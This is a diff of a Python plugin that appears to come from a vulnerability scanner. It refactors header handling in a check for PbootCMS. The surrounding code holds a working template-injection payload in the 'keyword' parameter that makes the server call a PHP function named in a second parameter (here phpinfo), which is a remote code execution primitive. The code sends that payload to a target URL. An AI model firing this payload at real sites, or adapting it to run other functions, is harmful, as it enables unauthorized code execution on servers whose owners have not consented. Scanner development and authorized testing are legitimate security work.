@@ -31,7 +31,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
@@ -44,14 +44,10 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
     try:
         payload="/index.php/index/index?keyword={pboot:if(1)$a=$_GET[b];$a();//)})}}{/pboot:if}&b=phpinfo"
         payload_url = scheme + "://" + url +":"+ str(port) + payload
-        header = {
-            'User-Agent': RandomAgent,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
-        req = request.Request(payload_url, headers=header,)
+        Headers['Content-Type']='application/x-www-form-urlencoded'
+        Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+
+        req = request.Request(payload_url, headers=Headers,)
         response = request.urlopen(req)
         con = response.read().decode('utf8')  # 如果编码报错，去除HTTP Header中的gzip参数即可
         code = response.getcode()
